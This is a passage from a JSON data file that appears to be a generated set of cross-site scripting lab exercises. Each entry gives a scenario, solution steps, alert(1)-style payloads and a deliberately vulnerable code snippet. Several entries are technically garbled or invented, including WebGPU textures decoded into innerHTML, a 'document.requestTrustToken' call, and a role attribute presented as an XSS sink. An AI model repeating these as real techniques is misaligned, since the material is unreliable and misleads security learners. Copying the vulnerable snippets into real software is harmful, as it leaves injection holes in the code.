      "srcCode": "navigator.serial.requestPort().then(port => {\n  document.getElementById('device').innerText = \n    port.getInfo().productName; // Vulnerable CSS unescape\n});"
    },
    {
      "Lab scenario": "SVG Filter Primitive XSS in Data Visualization Dashboard",
      "Lab Description": "Analytics platform implements SVG filters with unsafe foreignObject processing. The application uses <feImage> with data: URLs without MIME validation. To solve: Achieve XSS through filter chain injection.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Craft SVG filter: <feImage xlink:href='data:text/html,<script>alert(1)</script>'/>",
        "Bypass CSP using filter composition",
        "Chain with <animate> timing attacks",
        "Automate with D3.js visualization toolkit",
        "Verify through dashboard PDF export"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<filter id='x'><feImage result='xss' href='data:text/html,<script>alert(1)</script>'/></filter>",
        "<feFuncR type='table' tableValues='</text><script>alert(1)</script>'/>"
      ],
      "srcCode": "const svg = `<svg>${userInput}</svg>`;\ndocument.body.insertAdjacentHTML('beforeend', svg); // Vulnerable"
    },
    {
      "Lab scenario": "WebGPU Storage Texture XSS in 3D Medical Imaging",
      "Lab Description": "Radiology viewer uses storage textures for volume rendering with unsafe buffer mapping to DOM. The application writes scan metadata into textures via compute shaders without validation. To solve: Inject HTML through crafted texture data writes.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Analyze texture bind groups via WebGPU Inspector",
        "Craft payload: [[group(1), binding(0)]] var<storage> x: array<u32> = [0x3C736372...];",
        "Bypass texture format validation using rgba8unorm",
        "Chain with timestamp queries for synchronization",
        "Verify through DICOM viewer overlay"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "device.createTexture({ format: 'rgba8unorm', usage: GPUTextureUsage.STORAGE }).createView()",
        "[[stage(compute)]] fn main() { textureStore(xTexture, vec2<i32>(), vec4<f32>(0.0)); }"
      ],
      "srcCode": "const texture = device.createTexture({ /* User-controlled */ });\ndocument.getElementById('scan-data').innerHTML = \n  new TextDecoder().decode(texture.read()); // Vulnerable"
    },
    {
      "Lab scenario": "Private Access Token Bypass in Paywall System",
      "Lab Description": "News paywall implements PATs with unsafe token reflection in <meta> tags. The application leaks token details via innerHTML for debugging. To solve: Forge PATs containing XSS payloads through Chrome's Trust Token API.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept PAT issuance via DevTools Protocol",
        "Craft payload: document.requestTrustToken({type: 'token-commitment', data: '<script>'})",
        "Bypass issuer validation using DNS CNAME cloaking",
        "Automate with Puppeteer trustToken API",
        "Verify through paywall debug mode"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<meta name='trust-token' content='<script>alert(1)</script>'>",
        "fetch('https://issuer', { trustToken: { type: 'send-redemption-record' } })"
      ],
      "srcCode": "app.get('/token', (req, res) => {\n  res.send(`<meta name='pat' content='${req.query.token}'>`); // Vulnerable\n});"
    },
    {
      "Lab scenario": "CSS Nesting Injection in Design System Theme Editor",
      "Lab Description": "UI theme builder processes nested CSS rules with vulnerable postcss-preset-env configuration. The application uses insertRule() with raw user input. To solve: Break style context through deeply nested @media queries.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify nesting depth limit via trial/error",
        "Craft payload: @media (width: </style><script>alert(1)</script>) { & { color: red } }",
        "Bypass sanitizer using CSS escape sequences",
        "Chain with :has() selector polyfill",
        "Verify through theme preview iframe"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "@layer x { @media \\3C script\\3E { & { content: \"alert(1)\" } }",
        ":is(&, </style><svg/onload=alert(1)>) { color: red }"
      ],
      "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(userInput); // Vulnerable\ndocument.adoptedStyleSheets = [sheet];"
    },
    {
      "Lab scenario": "WebTransport Datagram XSS in Autonomous Vehicle Control",
      "Lab Description": "Self-driving car interface uses unidirectional WebTransport datagrams for sensor updates. The application renders LIDAR data via innerHTML without validation. To solve: Inject payloads through malformed QUIC datagram buffers.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Capture WebTransport session using Wireshark QUIC dissector",
        "Craft payload: new TextEncoder().encode('</script><svg onload=alert(1)>')",
        "Bypass MTU limits using DATAGRAM frame fragmentation",
        "Automate with webtransport-go client",
        "Verify through 3D point cloud visualization"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "quic.SendDatagram([]byte{'<','s','c','r','i','p','t','>'})",
        "data:application/datagram;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
      ],
      "srcCode": "const decoder = new TextDecoder();\ntransport.datagrams.readable.getReader().read().then(({value}) => {\n  document.body.innerHTML += decoder.decode(value); // Vulnerable\n});"
    },
    {
      "Lab scenario": "ARIA 1.3 Role Bypass in Accessibility Dashboard",
      "Lab Description": "WCAG compliance tool implements ARIA 1.3 roles with dangerous role=generic parsing. The application uses setAttribute('role') with user input. To solve: Achieve XSS through role=alertdialog and aria-errormessage chaining.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify ARIA 1.3 role support via a11y tree",
        "Craft payload: <div role='generic' aria-errormessage='</div><script>alert(1)</script>'>",
        "Bypass sanitizer using ARIA relationship attributes",
        "Chain with aria-live assertive mode",
        "Verify through axe-core audits"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<div role='math' aria-describedat='x'><template id='x' shadowroot=open><script>alert(1)</script>",
        "<span role='none' aria-details='</span><svg/onload=alert(1)>'></span>"
      ],
      "srcCode": "function setRole(userRole) {\n  element.setAttribute('role', userRole); // Vulnerable\n}"
    }
  
]